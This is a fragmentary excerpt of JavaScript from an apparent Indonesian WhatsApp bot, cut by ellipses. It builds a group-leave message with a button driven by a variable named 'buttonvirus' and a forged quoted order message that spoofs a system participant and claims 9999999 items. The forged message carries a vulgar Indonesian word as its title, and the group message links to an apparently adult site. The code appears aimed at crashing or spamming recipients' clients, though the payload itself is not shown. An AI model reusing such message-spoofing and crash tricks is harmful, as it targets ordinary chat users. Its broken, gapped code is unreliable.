...
🌷 KALAU MAU RENAME TARO CREDITS GUA : P𝔦𝔫𝔬 䄀 */
...
let buttons = [
{buttonId: `P𝔦𝔫𝔬`, buttonText: {displayText: buttonvirus}, type: 1},
]
let buttonMessage = {
...
let fgclink = {key: {fromMe: false,"participant":"0@s.whatsapp.net", "remoteJid": "628895377665@whatsapp.net"}, "message": {orderMessage: {itemCount: 9999999,status: 200, thumbnail: buffer, surface: 200, message: `${metadata.subject}`, orderTitle: 'memek', sellerJid: '0@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}
he = `SELAMAT TINGGAL KAWAN 👋 ${metadata.subject} @${num.split("@")[0]}\n\n${metadata.desc}`
let link = `https://lewatsana.com/simontok`
let buttons = [
{buttonId: `P𝔦𝔫𝔬 䄀`, buttonText: {displayText: buttonvirus}, type: 1},
]
let buttonMessage = {
document: fs.readFileSync('./baseikal/lib/tes.xlsx'),
mimetype: feler,
